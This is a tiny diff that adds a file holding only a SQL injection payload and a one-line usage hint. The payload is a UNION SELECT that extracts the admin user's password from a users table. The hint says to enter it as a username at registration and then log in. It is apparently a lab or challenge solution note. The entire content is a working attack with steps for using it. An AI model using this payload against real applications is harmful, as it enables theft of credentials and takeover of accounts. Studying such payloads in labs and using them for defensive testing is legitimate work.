@@ -1,0 +1,3 @@
+admin' UNION SELECT pass, Null as user, Null as post FROM users where user = 'admin
+
+Inject in username field in registration, then log in
